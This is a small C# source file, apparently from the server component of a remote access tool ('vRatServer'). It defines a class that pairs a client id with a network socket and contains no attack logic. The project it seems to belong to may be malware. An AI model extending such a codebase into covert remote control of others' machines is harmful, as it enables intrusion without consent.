using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace vRatServer.Classes
{
    class socket_details
    {
        public ulong id;
        public Socket s;
        public socket_details(ulong id, Socket s)
        {
            this.s = s;
            this.id = id;
        }
        ~socket_details()
        {
            
        }
    }
}
